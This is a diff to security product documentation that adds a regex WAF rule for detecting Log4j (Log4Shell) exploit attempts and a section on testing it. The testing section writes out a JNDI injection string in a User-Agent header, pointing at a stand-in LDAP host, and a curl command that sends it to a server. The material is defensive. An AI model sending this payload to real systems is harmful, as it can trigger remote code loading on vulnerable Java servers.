@@ -47,13 +47,6 @@ istio\_(\w){5}
 
 ***Sensors must be applied to a Group to become effective.***
 
-***Log4j Detection Pattern***  The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.
-```
-\$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
-```
-
-Also note that there are ways that attackers could bypass detection by such rules.
-
 #### Applying DLP/WAF Sensors to Container Groups
 To activate a DLP or WAF sensor, go to Policy -> Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).
 
@@ -80,6 +73,25 @@ When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, w
 + Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.
 + Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.
 + Protect mode. The action will be to alert if set to Alert, or block if set to Deny.
+
+####Log4j Detection WAF Pattern
+The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.
+```
+\$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
+```
+
+Also note that there are ways that attackers could bypass detection by such rules.
+
+####Testing the Log4j WAF Detection
+In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:
+```
+User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}
+```
+
+Using curl to POST data to server(container) can help to test WAF rule:
+```
+curl  -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d '$SOME_DATA' "http://$SOME_IP_:$PORT"
+```
 
 #### Sample Alerts
 
